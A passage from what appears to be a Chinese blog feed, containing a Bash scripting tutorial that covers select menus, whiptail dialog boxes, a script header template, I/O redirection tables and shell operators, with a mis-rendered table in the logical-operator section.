variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>${#word}<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token keyword">echo</span> $<span class="token punctuation">{</span>word:i:1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>以 ASCII 字符显示文件：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$od</span> -c filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bash Shell脚本编写技巧</title>
      <link href="/post/5580e2ac.html"/>
      <url>/post/5580e2ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="Bash-Shell-脚本编写技巧"><a href="#Bash-Shell-脚本编写技巧" class="headerlink" title="Bash Shell 脚本编写技巧"></a>Bash Shell 脚本编写技巧</h1><h2 id="一、文档参考"><a href="#一、文档参考" class="headerlink" title="一、文档参考"></a>一、文档参考</h2><ul><li><a href="https://www.bookstack.cn/read/google-shell-style/0.md">《Google Shell 风格指南》</a></li><li><a href="https://linuxstory.gitbook.io/advanced-bash-scripting-guide-in-chinese/">《高级 Bash 脚本编程指南》</a></li><li><a href="https://mp.weixin.qq.com/s/s5oXfeOODthA_Nl3p__bZQ">《技能篇：shell 教程及脚本编写》</a></li><li><a href="https://hellolinux.readthedocs.io/zh_CN/latest/06_echo_color_font.html">《echo 输出带颜色的字体》</a></li><li>​<a href="https://www.runoob.com/linux/linux-shell-basic-operators.html">《Shell 基本运算符》</a></li></ul><p>​</p><h2 id="二、菜单选择"><a href="#二、菜单选择" class="headerlink" title="二、菜单选择"></a>二、菜单选择</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>SECENEKLER<span class="token operator">=</span><span class="token string">"A B C"</span><span class="token keyword">select</span> i <span class="token keyword">in</span> <span class="token variable">$SECENEKLER</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token operator">=</span> <span class="token string">"C"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">exit</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token operator">=</span> <span class="token string">"B"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token keyword">echo</span> <span class="token string">"帮助菜单"</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">df</span> -h    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token string">"不明白？"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、Whiptail-交互式"><a href="#三、Whiptail-交互式" class="headerlink" title="三、Whiptail 交互式"></a>三、Whiptail 交互式</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;message box title>"</span> --msgbox <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="创建消息框"><a href="#创建消息框" class="headerlink" title="创建消息框"></a>创建消息框</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>whiptail --title <span class="token string">"Test Message Box"</span> --msgbox <span class="token string">"Create a message box with whiptail. Choose Ok to continue."</span> 10 60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163622406-6018f3b9-555c-4844-a660-6409b2e475a2.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=510&amp;id=u0dde12f9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=510&amp;originWidth=737&amp;originalType=binary%E2%88%B6=1&amp;size=241782&amp;status=done&amp;style=none&amp;taskId=u0c0a6c7e-e23f-413e-8c77-3b0bea38e2a&amp;width=737" alt="image.png"></p><h3 id="创建-yes-no-对话框"><a href="#创建-yes-no-对话框" class="headerlink" title="创建 yes/no 对话框"></a>创建 yes/no 对话框</h3><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;dialog box title>"</span> --yesno <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">(</span>whiptail --title <span class="token string">"Test Yes/No Box"</span> --yesno <span class="token string">"Choose between Yes and No."</span> 10 60<span class="token punctuation">)</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Yes. Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose No. Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163670077-2477eba4-eeba-410a-b0eb-6a1c85f76f82.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=509&amp;id=ua0ead1b7&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=737&amp;originalType=binary%E2%88%B6=1&amp;size=237693&amp;status=done&amp;style=none&amp;taskId=u9bf1e3d3-e751-4c80-bb0d-814aa31e8ef&amp;width=737" alt="image.png"></p><p>使用“–yes-button”、“–no-button”选项自定义确认选项</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">(</span>whiptail --title <span class="token string">"Test Yes/No Box"</span> --yes-button <span class="token string">"Skittles"</span> --no-button <span class="token string">"M&amp;M's"</span>  --yesno <span class="token string">"Which do you like better?"</span> 10 60<span class="token punctuation">)</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Skittles Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose M&amp;M's. Exit status was <span class="token variable">$?</span>."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163704245-5d15dbcc-c155-4ea7-9cee-7ef78d5bf328.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=507&amp;id=u34697dbe&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=507&amp;originWidth=735&amp;originalType=binary%E2%88%B6=1&amp;size=143991&amp;status=done&amp;style=none&amp;taskId=u10e049f8-51a7-42b8-b247-9f81a8a4155&amp;width=735" alt="image.png"></p><h3 id="创建一个表单输入框"><a href="#创建一个表单输入框" class="headerlink" title="创建一个表单输入框"></a>创建一个表单输入框</h3><p>如果你想用户输入任意的文本，您可以使用一个输入框<br>​</p><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;input box title>"</span> --inputbox <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>default-text<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>PET<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Free-form Input Box"</span> --inputbox <span class="token string">"What is your pet's name?"</span> 10 60 Wigglebutt 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your pet name is:"</span> <span class="token variable">$PET</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163752741-5962032e-7603-435b-9876-2aead1ee3a44.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=512&amp;id=uc0b4a5f2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=512&amp;originWidth=738&amp;originalType=binary%E2%88%B6=1&amp;size=168127&amp;status=done&amp;style=none&amp;taskId=u6ea72af4-5823-4d62-bec1-1b786a0c5dd&amp;width=738" alt="image.png"></p><h3 id="创建一个密码框"><a href="#创建一个密码框" class="headerlink" title="创建一个密码框"></a>创建一个密码框</h3><p>当用户需要输入敏感信息时使用密码框<br>​</p><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;password box title>"</span> --passwordbox <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>PASSWORD<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Password Box"</span> --passwordbox <span class="token string">"Enter your password and choose Ok to continue."</span> 10 60 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your password is:"</span> <span class="token variable">$PASSWORD</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163793208-dd4fec14-bee1-4cef-834f-79a938a3120c.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=508&amp;id=uec53f3f8&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=508&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=168365&amp;status=done&amp;style=none&amp;taskId=u526e141f-6c04-496a-abba-00c0fb8177c&amp;width=732" alt="image.png"></p><h3 id="创建一个菜单栏"><a href="#创建一个菜单栏" class="headerlink" title="创建一个菜单栏"></a>创建一个菜单栏</h3><p>当你想让用户选择一个任意数量的选择中，你可以使用菜单栏<br>​</p><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;menu title>"</span> --menu <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>menu height<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span>tag<span class="token operator">></span> <span class="token operator">&lt;</span>item<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token keyword">.</span> <span class="token keyword">.</span> <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>OPTION<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Menu Dialog"</span> --menu <span class="token string">"Choose your option"</span> 15 60 4 \<span class="token string">"1"</span> <span class="token string">"Grilled Spicy Sausage"</span> \<span class="token string">"2"</span> <span class="token string">"Grilled Halloumi Cheese"</span> \<span class="token string">"3"</span> <span class="token string">"Charcoaled Chicken Wings"</span> \<span class="token string">"4"</span> <span class="token string">"Fried Aubergine"</span>  3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your chosen option:"</span> <span class="token variable">$OPTION</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163830688-c8e641b9-1431-496f-86c9-7d67aee26883.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=505&amp;id=u2ef8e20c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=505&amp;originWidth=734&amp;originalType=binary%E2%88%B6=1&amp;size=83525&amp;status=done&amp;style=none&amp;taskId=u7d96024a-56a7-4118-b207-58e412f5eef&amp;width=734" alt="image.png"></p><h3 id="创建-radiolist-单选对话框"><a href="#创建-radiolist-单选对话框" class="headerlink" title="创建 radiolist 单选对话框"></a>创建 radiolist 单选对话框</h3><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;radiolist title>"</span> --radiolist <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>list height<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span>tag<span class="token operator">></span> <span class="token operator">&lt;</span>item<span class="token operator">></span> <span class="token operator">&lt;</span>status<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token keyword">.</span> <span class="token keyword">.</span> <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>DISTROS<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Checklist Dialog"</span> --radiolist \<span class="token string">"What is the Linux distro of your choice?"</span> 15 60 4 \<span class="token string">"debian"</span> <span class="token string">"Venerable Debian"</span> ON \<span class="token string">"ubuntu"</span> <span class="token string">"Popular Ubuntu"</span> OFF \<span class="token string">"centos"</span> <span class="token string">"Stable CentOS"</span> OFF \<span class="token string">"mint"</span> <span class="token string">"Rising Star Mint"</span> OFF 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"The chosen distro is:"</span> <span class="token variable">$DISTROS</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163873230-5ffe760d-c001-4718-870f-8c3bfc0c38d4.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=509&amp;id=u578b84c1&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=509&amp;originWidth=735&amp;originalType=binary%E2%88%B6=1&amp;size=314554&amp;status=done&amp;style=none&amp;taskId=ua3ca19b2-596c-46b3-b64b-304f95fe625&amp;width=735" alt="image.png"></p><h3 id="创建一个多选对话框"><a href="#创建一个多选对话框" class="headerlink" title="创建一个多选对话框"></a>创建一个多选对话框</h3><p>当你想让用户选择一个列表中选择多个选项，可以使用多选对话框<br>​</p><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --title <span class="token string">"&lt;checklist title>"</span> --checklist <span class="token string">"&lt;text to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>list height<span class="token operator">></span> <span class="token punctuation">[</span> <span class="token operator">&lt;</span>tag<span class="token operator">></span> <span class="token operator">&lt;</span>item<span class="token operator">></span> <span class="token operator">&lt;</span>status<span class="token operator">></span> <span class="token punctuation">]</span> <span class="token keyword">.</span> <span class="token keyword">.</span> <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>DISTROS<span class="token operator">=</span><span class="token punctuation">$(</span>whiptail --title <span class="token string">"Test Checklist Dialog"</span> --checklist \<span class="token string">"Choose preferred Linux distros"</span> 15 60 4 \<span class="token string">"debian"</span> <span class="token string">"Venerable Debian"</span> ON \<span class="token string">"ubuntu"</span> <span class="token string">"Popular Ubuntu"</span> OFF \<span class="token string">"centos"</span> <span class="token string">"Stable CentOS"</span> ON \<span class="token string">"mint"</span> <span class="token string">"Rising Star Mint"</span> OFF 3<span class="token operator">></span><span class="token operator">&amp;</span>1 1<span class="token operator">></span><span class="token operator">&amp;</span>2 2<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token punctuation">)</span>exitstatus<span class="token operator">=</span><span class="token variable">$?</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$exitstatus</span> <span class="token operator">=</span> 0 <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"Your favorite distros are:"</span> <span class="token variable">$DISTROS</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token string">"You chose Cancel."</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163903130-586dcef6-5637-4ccd-9800-bbe915c495f2.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=508&amp;id=uf9ff342b&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=508&amp;originWidth=736&amp;originalType=binary%E2%88%B6=1&amp;size=313912&amp;status=done&amp;style=none&amp;taskId=u5491e5df-4b69-4bcc-88e0-991ee92dfcf&amp;width=736" alt="image.png"></p><h3 id="创建一个进度条"><a href="#创建一个进度条" class="headerlink" title="创建一个进度条"></a>创建一个进度条</h3><p>whiptail 从标准输入读取一个百分数（0 ～ 100），使用进度条显示相应的计数<br>​</p><p>语法</p><pre class="line-numbers language-bash"><code class="language-bash">whiptail --gauge <span class="token string">"&lt;test to show>"</span> <span class="token operator">&lt;</span>height<span class="token operator">></span> <span class="token operator">&lt;</span>width<span class="token operator">></span> <span class="token operator">&lt;</span>inital percent<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>示例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">100</span> <span class="token punctuation">;</span> i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token function">sleep</span> 1        <span class="token keyword">echo</span> <span class="token variable">$i</span>    <span class="token keyword">done</span><span class="token punctuation">}</span> <span class="token operator">|</span> whiptail --gauge <span class="token string">"Please wait while installing"</span> 6 60 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628163942684-40ec2978-0590-4b3d-bed4-6feb45050357.png#clientId=uff91f57e-417a-4&amp;from=paste&amp;height=507&amp;id=ub21196fa&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=507&amp;originWidth=736&amp;originalType=binary%E2%88%B6=1&amp;size=222540&amp;status=done&amp;style=none&amp;taskId=uaf5760e3-94ea-45c0-9cf9-26fde325f12&amp;width=736" alt="image.png"><br>​</p><h2 id="四、模板"><a href="#四、模板" class="headerlink" title="四、模板"></a>四、模板</h2><h3 id="文件头注释模板"><a href="#文件头注释模板" class="headerlink" title="文件头注释模板"></a>文件头注释模板</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># -----------------------------------------</span><span class="token comment" spellcheck="true"># name       : example.sh</span><span class="token comment" spellcheck="true"># createTime : 2025-08-22</span><span class="token comment" spellcheck="true"># author     : birdben</span><span class="token comment" spellcheck="true"># email      : example@163.com</span><span class="token comment" spellcheck="true"># description: shell脚本的功能描述</span><span class="token comment" spellcheck="true"># -----------------------------------------</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><h2 id="五、标准输入输出"><a href="#五、标准输入输出" class="headerlink" title="五、标准输入输出"></a>五、标准输入输出</h2><table><thead><tr><th><strong>设备</strong></th><th><strong>设备文件名</strong></th><th><strong>文件描述符</strong></th><th><strong>类型</strong></th></tr></thead><tbody><tr><td>键盘 ⌨️</td><td>/dev/stdin</td><td>0</td><td>标准输入</td></tr><tr><td>显示器 🖥</td><td>/dev/stdout</td><td>1</td><td>标准输出</td></tr><tr><td>显示器 🖥</td><td>/dev/stderr</td><td>2</td><td>标准错误输出</td></tr></tbody></table><h2 id="六、输入输出重定向"><a href="#六、输入输出重定向" class="headerlink" title="六、输入输出重定向"></a>六、输入输出重定向</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>command &gt; file</td><td>将输出重定向到 file。</td></tr><tr><td>command &lt; file</td><td>将输入重定向到 file。</td></tr><tr><td>command &gt;&gt; file</td><td>将输出以追加的方式重定向到 file。</td></tr><tr><td>n &gt; file</td><td>将文件描述符为 n 的文件重定向到 file。</td></tr><tr><td>n &gt;&gt; file</td><td>将文件描述符为 n 的文件以追加的方式重定向到 file。</td></tr><tr><td>n &gt;&amp; m</td><td>将输出文件 m 和 n 合并。</td></tr><tr><td>n &lt;&amp; m</td><td>将输入文件 m 和 n 合并。</td></tr><tr><td>&lt;&lt; tag</td><td>将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td></tr></tbody></table><h2 id="七、运算符"><a href="#七、运算符" class="headerlink" title="七、运算符"></a>七、运算符</h2><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>关系运算符只支持数字，不支持字符串，除非字符串的值是数字。<br>下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：</p><table><thead><tr><th><strong>运算符</strong></th><th><strong>说明</strong></th><th><strong>举例</strong></th></tr></thead><tbody><tr><td>-eq</td><td>检测两个数是否相等，相等返回 true。</td><td>[ $a -eq $b ] 返回 false</td></tr><tr><td>-ne</td><td>检测两个数是否不相等，不相等返回 true。</td><td>[ $a -ne $b ] 返回 true</td></tr><tr><td>-gt</td><td>检测左边的数是否大于右边的，如果是，则返回 true。</td><td>[ $a -gt $b ] 返回 false</td></tr><tr><td>-lt</td><td>检测左边的数是否小于右边的，如果是，则返回 true。</td><td>[ $a -lt $b ] 返回 true</td></tr><tr><td>-ge</td><td>检测左边的数是否大于等于右边的，如果是，则返回 true。</td><td>[ $a -ge $b ] 返回 false</td></tr><tr><td>-le</td><td>检测左边的数是否小于等于右边的，如果是，则返回 true。</td><td>[ $a -le $b ] 返回 true</td></tr></tbody></table><p>​</p><h3 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h3><p>下表列出了常用的布尔运算符，假定变量 a 为 10，变量 b 为 20：</p><table><thead><tr><th><strong>运算符</strong></th><th><strong>说明</strong></th><th><strong>举例</strong></th></tr></thead><tbody><tr><td>!</td><td>非运算，表达式为 true 则返回 false，否则返回 true。</td><td>[ ! false ] 返回 true。</td></tr><tr><td>-o</td><td>或运算，有一个表达式为 true 则返回 true。</td><td>[ $a -lt 20 -o $b -gt 100 ] 返回 true。</td></tr><tr><td>-a</td><td>与运算，两个表达式都为 true 才返回 true。</td><td>[ $a -lt 20 -a $b -gt 100 ] 返回 false。</td></tr></tbody></table><p>实例</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>a<span class="token operator">=</span>10b<span class="token operator">=</span>20<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> != <span class="token variable">$b</span> : a 不等于 b"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> == <span class="token variable">$b</span>: a 等于 b"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -lt 100 -a <span class="token variable">$b</span> -gt 15 <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> 小于 100 且 <span class="token variable">$b</span> 大于 15 : 返回 true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> 小于 100 且 <span class="token variable">$b</span> 大于 15 : 返回 false"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -lt 100 -o <span class="token variable">$b</span> -gt 100 <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> 小于 100 或 <span class="token variable">$b</span> 大于 100 : 返回 true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> 小于 100 或 <span class="token variable">$b</span> 大于 100 : 返回 false"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -lt 5 -o <span class="token variable">$b</span> -gt 100 <span class="token punctuation">]</span><span class="token keyword">then</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> 小于 5 或 <span class="token variable">$b</span> 大于 100 : 返回 true"</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">$a</span> 小于 5 或 <span class="token variable">$b</span> 大于 100 : 返回 false"</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20：</p><p>| 运算符 | 说明       | 举例                                    |<br>| —— | ———- | ————————————— | ——— | ————- | — | ———————– |<br>| &amp;&amp;     | 逻辑的 AND | [[$a -lt 100 &amp;&amp; $b -gt 100]] 返回 false |<br>|        |            |                                         | 逻辑的 OR | [[ $a -lt 100 |     | $b -gt 100 ]] 返回 true |</p><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>下表列出了常用的字符串运算符，假定变量 a 为 “abc”，变量 b 为 